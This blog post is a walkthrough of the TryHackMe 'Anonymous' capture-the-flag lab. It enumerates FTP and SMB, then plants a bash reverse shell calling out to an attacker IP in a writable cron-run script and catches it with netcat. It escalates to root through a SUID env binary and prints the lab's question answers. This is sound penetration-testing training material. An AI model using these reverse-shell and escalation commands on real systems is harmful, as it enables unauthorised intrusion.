<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Anonymous TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/anonymous-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-05T18:45:22+00:00">May 5, 2021</time><time class="updated" datetime="2025-06-24T10:17:53+00:00">June 24, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today it is time to solve another challenge called “Anonymous”. It is available at TryHackMe for penetration testing practice. This challenge is of medium difficulty if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The credit for making this machine goes to <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.tryhackme.com/p/Nameless0ne">Nameless0ne</a></span>. The breakdown of the Machine with the redacted flags is as follow:</span></p>
<p><span style="color: #000000;"><strong>Level: Medium</strong></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Enumerating FTP Service</span></li>
<li><span style="color: #000000;">Downloading scripts from FTP</span></li>
<li><span style="color: #000000;">Investigating Scripts</span></li>
<li><span style="color: #000000;">Enumerating SMB Shares</span></li>
<li><span style="color: #000000;">Downloading Image files from Shares</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">Uploading Reverse Shell Script on FTP</span></li>
<li><span style="color: #000000;">Getting User Shell</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Enumerating for SUID bits</span></li>
<li><span style="color: #000000;">Exploiting SUID on env</span></li>
<li><span style="color: #000000;">Reading Root Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">There are two flags in this machine to discover. After Booting up the target machine from the <a style="color: #000000;" href="https://www.tryhackme.com/room/anonymous"><span style="color: #0000ff;"><strong>TryHackMe: Anonymous</strong></span></a> Page, An IP will be assigned to the machine and will be visible on that page as well.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.3.52</strong></span></p>
<p><span style="color: #000000;">Apart from the two flags, you need four questions to complete this machine. You can find the questions below as you discover the answers.</span></p>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">To begin, one must gain information about the various services running on different ports on the machine. Therefore, users employ Nmap for scanning those using the -sC and -sV flag. Consequently, they perform a Default Scripts scan and find the versions of the services enumerated respectively.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.10.3.52</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yNtKczjsMCA/YJLjV6boynI/AAAAAAAAv1A/0YZQ9jiIK20Yg2AAvnrc1aIkbuGX8UimACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Nmap detected FTP service running on port 21, SSH service on port 22, SMB on port 139 and 445. The Nmap also detected that the application has enabled Anonymous Login, making it accessible right away.</span></p>
<p><span style="color: #000000;"><strong><em>Q.1. Enumerate the machine.  How many ports are open?</em></strong></span></p>
<p><span style="color: #000000;"><strong><em>4</em></strong></span></p>
<p><span style="color: #000000;"><strong><em>Q.2. What service is running on port 21?</em></strong></span></p>
<p><span style="color: #000000;"><strong><em>FTP</em></strong></span></p>
<p><span style="color: #000000;"><strong><em>Q.3. What service is running on ports 139 and 445?</em></strong></span></p>
<p><span style="color: #000000;"><strong><em>SMB</em></strong></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Logging into FTP, a scripts directory was found. The scripts directory contained a shell script called clean.sh, A log file by the name of removed_files.log and a text file named to_do.txt. All of these files were downloaded to the Local Kali Linux Machine for further investigation.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.10.3.52
ls -la
cd scripts
ls -la
get clean.sh
get removed_files.log
get to_do.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wv9XbABOXDo/YJLkRO_UwlI/AAAAAAAAv1I/TkjMTChh3UUQG7y4V9J5QbjdSmdgN_nHwCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">The to_do.txt file was a reminder for disabling Anonymous Login. It is not useful from the attacker’s perspective. The removed_files.log file contained logs from the clean-up script indicating that there is nothing to delete.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat to_do.txt
cat removed_files.log</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TxIkfg5HgAM/YJLkU5YeaPI/AAAAAAAAv1M/MdVFNUTnGSIZ7GEExCV15JEOqtMU4Sf-ACLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">The clean. sh script is a shell script that seemed to perform log entries and delete files from the /tmp/ directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat clean.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eeV_9iZuPA0/YJLkY4cMMMI/AAAAAAAAv1Q/fI8Z84hGDPMSHwE-ls6KjaM6cKDXJatXQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">With nothing more to enumerate from the FTP service, we initiated the enumeration of the SMB service. We used Smbclient to perform an Anonymous login on the Target Machine. The Target Machine had a share by the name of pics. When we accessed the pics share, we found two images: corgo2.jpg and puppos.jpeg. We downloaded both of those images to the local Kali Machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L \\anonymous -I 10.10.3.52
smbclient //10.10.3.52/pics
ls
get corgo2.jpg
get puppos.jpeg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J1W9xDzBXWg/YJLkd75zRgI/AAAAAAAAv1U/coJjBcUZJYkMDWcdMPRZpXhFjc_LYpXjwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;"><strong><em>Q.4. There’s a share on the user’s computer.  What’s it called?</em></strong></span></p>
<p><span style="color: #000000;"><strong><em>pics</em></strong></span></p>
<p><span style="color: #000000;">After opening the image files, it was clear that SMB was supposed to be a rabbit hole. Both images are not important from the attacker’s perspective.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4cBR08xY0P4/YJLkhJziCFI/AAAAAAAAv1Y/DoWV1-8jZcII_w_2hFDFxYoxeqIEjIlqgCLcBGAsYHQ/s16000/6.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">Back to the FTP service, they detected that someone could upload files in the scripts directory. The attacker could create a clean.sh script with reverse shellcode inside it, replace it with the one that is currently located on the target machine, and then wait for the script to get executed.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano clean.sh
bash -i &gt;&amp; /dev/tcp/10.10.120.144/1234 0&gt;&amp;1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8de0PjtAXvE/YJLkkoWmLBI/AAAAAAAAv1k/d1bJCfs2Fic22jDk9LObbsbwtNtrkCttgCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Before uploading the script, we started a netcat listener on the Local Kali Machine to capture the shell that the target machine would invoke after executing the clean.sh script. We must use the port number mentioned inside the reverse shell script while invoking the netcat listener. After connecting to the FTP service, we replaced the clean.sh script using the put command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.10.3.52
cd scripts
put clean.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X1uAT1IlJ1I/YJLkw1GGHbI/AAAAAAAAv1s/wNkaBQzNyM0OXR6qEg4vemJYrP8M4KypwCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">The netcat listener captured the reverse shell generated by the execution of the clean.sh script on the target machine. Subsequently, the namelessone user on the target machine initiated the session. After listing the contents of the user’s home directory, they then found the user.txt flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
ls
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RV1FgeBEcaw/YJLk17fqWeI/AAAAAAAAv1w/MFLsocenlEwds9EUi6xxDLVE1k51Ssg2wCLcBGAsYHQ/s16000/9.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">The post-exploitation enumeration to find methods for elevating privileges began by enumerating the SUID bits. To perform this, the find command was used, which is commonly applied for such enumeration. Interestingly, we observed that someone had assigned the SUID bit to /usr/bin/env. As a result, this meant that a user could potentially exploit it to gain elevated access to the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I2XQWGOynqg/YJLk9S_nRkI/AAAAAAAAv14/z6LiriN3c-8FfhMzALwnuIs3CalrG3VoACLcBGAsYHQ/s16000/10.png"/>            </span></p>
<p><span style="color: #000000;">To get the syntax of the env to elevate privileges, the researcher used <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://gtfobins.github.io/gtfobins/env/">GTFOBINS</a></span>. The analysis showed that the provided command doesn’t elevate privilege directly; instead, it creates a local SUID copy of the binary and runs it with elevated privileges. When you combine this with the /bin/sh, it can provide an elevated shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c3UMzIkC4gU/YJLlBXoiTCI/AAAAAAAAv2A/lW8X-PNRXvsWHy1k9dXO4NKKtwRXfi0KQCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">When executed on the namelessone’s shell, the attacker invoked a root shell. The attacker checked this using the whoami command. Finally, to finish the challenge, the attacker read the root flag using the cat command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/usr/bin/env /bin/sh -p
whoami
cat /root/root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A41nFMZnqvo/YJLlHQvWkBI/AAAAAAAAv2I/KTph6l7uy2YF0WK1AHItASIMUecxcdKUQCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Hope you have enjoyed this TryHackMe Write-up. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/">Link</a> </strong><span style="color: #000000;">for more TryHackMe CTF’s.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/simple-ctf-tryhackme-walkthrough/" title="Simple CTF TryHackMe Walkthrough">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Simple CTF TryHackMe Walkthrough</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/wonderland-tryhackme-walkthrough/" rel="prev">Wonderland TryHackMe Walkthrough</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/wireshark-for-pentester-decrypting-rdp-traffic/" rel="next">Wireshark for Pentester: Decrypting RDP Traffic</a></div></div>
	</nav>        </div>
